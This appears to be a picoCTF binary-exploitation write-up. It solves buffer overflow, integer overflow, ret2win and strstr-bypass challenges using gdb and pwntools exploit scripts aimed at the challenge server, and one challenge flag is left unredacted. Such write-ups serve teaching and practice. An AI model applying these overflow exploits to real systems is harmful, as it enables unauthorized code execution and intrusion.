### buffer overflow 0

Download the file and just fuzz it. I randomly inserted 30 bytes and got the flag.

```bash
➜  Binary-Exploitation git:(main) ✗ nc saturn.picoctf.net 61481
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{XXX}
```

### CVE-XXXX-XXXX

Just Google `first recorded remote code execution (RCE) vulnerability in 2021 in the Windows Print Spooler Service`.

![](../assets/cve-xxx-xxxxx.png)

### two-sum

Download the file and `cat` its content.

```c
#include <stdio.h>
#include <stdlib.h>

static int addIntOvf(int result, int a, int b) {
    result = a + b;
    if(a > 0 && b > 0 && result < 0)
        return -1;
    if(a < 0 && b < 0 && result > 0)
        return -1;
    return 0;
}

int main() {
    int num1, num2, sum;
    FILE *flag;
    char c;

    printf("n1 > n1 + n2 OR n2 > n1 + n2 \n");
    fflush(stdout);
    printf("What two positive numbers can make this possible: \n");
    fflush(stdout);
    
    if (scanf("%d", &num1) && scanf("%d", &num2)) {
        printf("You entered %d and %d\n", num1, num2);
        fflush(stdout);
        sum = num1 + num2;
        if (addIntOvf(sum, num1, num2) == 0) {
            printf("No overflow\n");
            fflush(stdout);
            exit(0);
        } else if (addIntOvf(sum, num1, num2) == -1) {
            printf("You have an integer overflow\n");
            fflush(stdout);
        }

        if (num1 > 0 || num2 > 0) {
            flag = fopen("flag.txt","r");
            if(flag == NULL){
                printf("flag not found: please run this on the server\n");
                fflush(stdout);
                exit(0);
            }
            char buf[60];
            fgets(buf, 59, flag);
            printf("YOUR FLAG IS: %s\n", buf);
            fflush(stdout);
            exit(0);
        }
    }
    return 0;
}
```

To print the flag we need to add two positive integers and have a negative result. We will add the `MAX_INT` value in `C` and `1` to achieve an integer overflow and get the flag.

```python
from pwn import *

context.log_level = 'critical'

r = remote('saturn.picoctf.net', 54011)

r.sendline(b'2147483647')
r.sendline(b'1')
print(f'\n{r.recvline_contains(b"pico").strip().decode()}\n')
```

```bash
➜  Binary-Exploitation git:(main) ✗ python solver.py

YOUR FLAG IS: picoCTF{XXX}
```

### buffer overflow 1

Download the files and `cat vuln.c` 

```c
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

We see there is a function that prints the flag (`win()`) and a `gets()`.

So, we have a typical `ret2win` challenge. We just need to find the offset to overwrite the return address and the address of `win()`.

We create a pattern in `gdb` and see that it crashed here:

```gdb
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

```gdb
0xffffd040│+0x0000: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"	 ← $esp
0xffffd044│+0x0004: "naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaaza[...]"
0xffffd048│+0x0008: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabba[...]"
0xffffd04c│+0x000c: "paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabca[...]"
0xffffd050│+0x0010: "qaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabda[...]"
0xffffd054│+0x0014: "raaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabea[...]"
0xffffd058│+0x0018: "saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfa[...]"
0xffffd05c│+0x001c: "taaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabga[...]"
───────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6161616c
───────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x6161616c in ?? (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────── trace ────
──────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern offset  maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaa
[+] Searching for 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaa'
[+] Found at offset 48 (big-endian search) 
```

We need to subtract 4 bytes to reach this value. The address of `win()` can be found with `pwntools`.

```python
from pwn import *

context.log_level = 'critical'

r = remote('saturn.picoctf.net', 58135)

e = ELF('./vuln')

r.sendline(b'A'*44 + p32(e.sym.win))

r.recvuntil(b'pico')

print(f'\nFlag --> pico{r.recv().decode()}\n')
```

```bash
➜  Binary-Exploitation git:(main) ✗ python solver.py

Flag --> picoCTF{XXX}
```

### RPS

Download the file and `cat` its content.

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/types.h>


#define WAIT 60



static const char* flag = "[REDACTED]";

char* hands[3] = {"rock", "paper", "scissors"};
char* loses[3] = {"paper", "scissors", "rock"};
int wins = 0;



int tgetinput(char *input, unsigned int l)
{
    fd_set          input_set;
    struct timeval  timeout;
    int             ready_for_reading = 0;
    int             read_bytes = 0;
    
    if( l <= 0 )
    {
      printf("'l' for tgetinput must be greater than 0\n");
      return -2;
    }
    
    
    /* Empty the FD Set */
    FD_ZERO(&input_set );
    /* Listen to the input descriptor */
    FD_SET(STDIN_FILENO, &input_set);

    /* Waiting for some seconds */
    timeout.tv_sec = WAIT;    // WAIT seconds
    timeout.tv_usec = 0;    // 0 milliseconds

    /* Listening for input stream for any activity */
    ready_for_reading = select(1, &input_set, NULL, NULL, &timeout);
    /* Here, first parameter is number of FDs in the set, 
     * second is our FD set for reading,
     * third is the FD set in which any write activity needs to updated,
     * which is not required in this case. 
     * Fourth is timeout
     */

    if (ready_for_reading == -1) {
        /* Some error has occured in input */
        printf("Unable to read your input\n");
        return -1;
    } 

    if (ready_for_reading) {
        read_bytes = read(0, input, l-1);
        if(input[read_bytes-1]=='\n'){
        --read_bytes;
        input[read_bytes]='\0';
        }
        if(read_bytes==0){
            printf("No data given.\n");
            return -4;
        } else {
            return 0;
        }
    } else {
        printf("Timed out waiting for user input. Press Ctrl-C to disconnect\n");
        return -3;
    }

    return 0;
}


bool play () {
  char player_turn[100];
  srand(time(0));
  int r;

  printf("Please make your selection (rock/paper/scissors):\n");
  r = tgetinput(player_turn, 100);
  // Timeout on user input
  if(r == -3)
  {
    printf("Goodbye!\n");
    exit(0);
  }

  int computer_turn = rand() % 3;
  printf("You played: %s\n", player_turn);
  printf("The computer played: %s\n", hands[computer_turn]);

  if (strstr(player_turn, loses[computer_turn])) {
    puts("You win! Play again?");
    return true;
  } else {
    puts("Seems like you didn't win this time. Play again?");
    return false;
  }
}


int main () {
  char input[3] = {'\0'};
  int command;
  int r;

  puts("Welcome challenger to the game of Rock, Paper, Scissors");
  puts("For anyone that beats me 5 times in a row, I will offer up a flag I found");
  puts("Are you ready?");
  
  while (true) {
    puts("Type '1' to play a game");
    puts("Type '2' to exit the program");
    r = tgetinput(input, 3);
    // Timeout on user input
    if(r == -3)
    {
      printf("Goodbye!\n");
      exit(0);
    }
    
    if ((command = strtol(input, NULL, 10)) == 0) {
      puts("Please put in a valid number");
      
    } else if (command == 1) {
      printf("\n\n");
      if (play()) {
        wins++;
      } else {
        wins = 0;
      }

      if (wins >= 5) {
        puts("Congrats, here's the flag!");
        puts(flag);
      }
    } else if (command == 2) {
      return 0;
    } else {
      puts("Please type either 1 or 2");
    }
  }

  return 0;
}
```

Focus on the important stuff.

We need 5 wins to get the flag.

```c
  if (wins >= 5) {
    puts("Congrats, here's the flag!");
    puts(flag);
  }
```

The program checks our answer with `strstr`.

```c
  if (strstr(player_turn, loses[computer_turn])) {
    puts("You win! Play again?");
```

From the `man` page of `strstr`:

```bash
STRSTR(3)                        Linux Programmer's Manual                        STRSTR(3)

NAME
       strstr, strcasestr - locate a substring

SYNOPSIS
       #include <string.h>

       char *strstr(const char *haystack, const char *needle);

       #define _GNU_SOURCE         /* See feature_test_macros(7) */

       #include <string.h>

       char *strcasestr(const char *haystack, const char *needle);

DESCRIPTION
       The  strstr()  function  finds  the  first occurrence of the substring needle in the
       string haystack.  The terminating null bytes ('\0') are not compared.
```

So, if we give all the possible answers as input, it will always come true and win.

```python
from pwn import *

r = remote('saturn.picoctf.net', 53864)

for i in range(5):
	r.sendline(b'1')
	r.sendline(b'rockpaperscissors')

r.recvuntil(b'pico')

print(f'\nFlag --> pico{r.recvuntil(b"}").decode()}\n')
```

```bash
➜  Binary-Exploitation git:(main) ✗ python solver.py
[+] Opening connection to saturn.picoctf.net on port 53864: Done

Flag --> picoCTF{50M3_3X7R3M3_1UCK_B69E01B8}

[*] Closed connection to saturn.picoctf.net port 53864
```

